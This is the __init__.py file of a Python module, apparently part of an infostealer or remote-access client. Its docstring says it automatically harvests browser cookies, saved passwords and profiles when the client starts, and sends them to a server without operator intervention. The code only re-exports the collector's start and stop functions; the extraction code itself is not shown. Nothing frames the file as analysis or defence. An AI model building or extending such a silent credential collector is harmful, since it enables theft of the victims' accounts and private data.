"""
Auto-collector module - automatically collects browser data on client startup.

This module provides automatic data collection for:
- Cookies (via cookie_extractor)
- Passwords (via password_extractor)
- Browser profiles

Data is collected asynchronously on client startup and sent to the server
without operator intervention.
"""
from __future__ import annotations

from .collector import AutoCollector, start_auto_collection, stop_auto_collection

__all__ = [
    "AutoCollector",
    "start_auto_collection",
    "stop_auto_collection",
]
